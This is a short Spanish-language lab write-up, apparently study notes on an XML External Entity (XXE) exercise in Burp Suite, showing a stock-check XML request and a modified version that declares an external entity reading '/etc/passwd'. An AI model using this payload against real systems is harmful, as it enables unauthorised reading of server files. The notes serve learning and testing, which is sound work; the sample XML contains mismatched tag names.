# XXE para leer archivos con entidades externas 

Tags: #XXE #XML #BurpSuite 

```bash 
Este lab permite la explotación de una vulnerabilidad XML External Entity (XXE) en una funcionalidad de comprobación de stock. Continuamos trabajando con peticiones XML personalizadas, donde aprovechamos la posibilidad de declarar entidades externas para acceder a archivos internos del sistema operativo.

- XXE: Es un tipo de ataque contra una aplicación que analiza la entrada XML. Este ataque se produce cuando un analizador XML dédidamente configurado procesa la entrada xml que contiene una referencia a una entidad externa 

- Entidad externa: Es cuando se carga el contenido de forma externa al documento y para ello se usa 'system' 
```

```xml 
<!-- Petición original con cabecera: 'Content-Type: application/xml' -->

<?xml version="1.0" encoding="UTF-8"?>
	<stockCehck>
		<productId>
			1
		</productId>
		<storedID>
			1
		</storedId>
	</stockCheck>
```

```xml
<!-- Petición modificada colocando una entidad externa general -->

<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>      
	<stockCehck>
		<productId>
			&xxe;
		</productId>
		<storedID>
			1
		</storedId>
	</stockCheck>


Notas:
	1. Buscar el campo inyectable en donde la respuesta refleje el contenido 
	2. Hacer una declaración de documento 'DOCTYPE'
	3. Colocar la ruta abosluta del archivo, File es wrapper similar a 'http://' y sirve para leer contenido de los archivos existentes en el sistema  
	4. SYSTEM = Cargar una entidad externa, como si fuera una URL de un servidor externo
```